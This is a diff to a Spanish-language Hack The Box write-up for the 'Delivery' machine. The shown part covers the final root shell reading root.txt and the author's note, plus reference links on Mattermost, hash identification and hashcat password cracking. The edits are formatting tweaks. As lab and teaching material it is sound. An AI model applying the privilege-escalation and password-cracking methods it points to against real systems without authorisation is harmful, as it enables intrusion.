 Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
@@ -756,8 +752,9 @@ mail.sh  note.txt  py-smtp.py  root.txt
 root@Delivery:~# cat root.txt
 ...
 ```
+
 Ya con esto, completamos la máquina. Pero ojito porque hay una nota, veámosla:
-```
+```bash
 root@Delivery:~# cat note.txt 
 I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times.  The inspiration for the box is here: 
 
@@ -767,7 +764,8 @@ Keep on hacking! And please don't forget to subscribe to all the security stream
 
 - ippsec
 ```
-Suscribete a su canal, gran maestro **Ippsec**
+Suscribete a su canal, gran maestro **Ippsec**.
+
 
 <br>
 <br>
@@ -778,12 +776,14 @@ Suscribete a su canal, gran maestro **Ippsec**
   </button>
 </div>
 
+
 * https://forum.mattermost.com/t/solved-how-to-check-currently-installed-mattermost-server-version/3543
 * https://www.drivemeca.com/mattermost-linux-server/
 * https://help.dreamhost.com/hc/es/articles/214882998-Conectarse-a-una-base-de-datos-v%C3%ADa-SSH
 * https://www.dragonjar.org/identificando-el-tipo-de-hash.xhtml
 * https://ciberseguridad.com/herramientas/hashcat/#Crea_un_diccionario_con_hashes_MBD5
 * https://jesux.es/cracking/passwords-cracking/
+* https://www.skysnag.com/es/blog/what-is-bcrypt/
 
 
 <br>
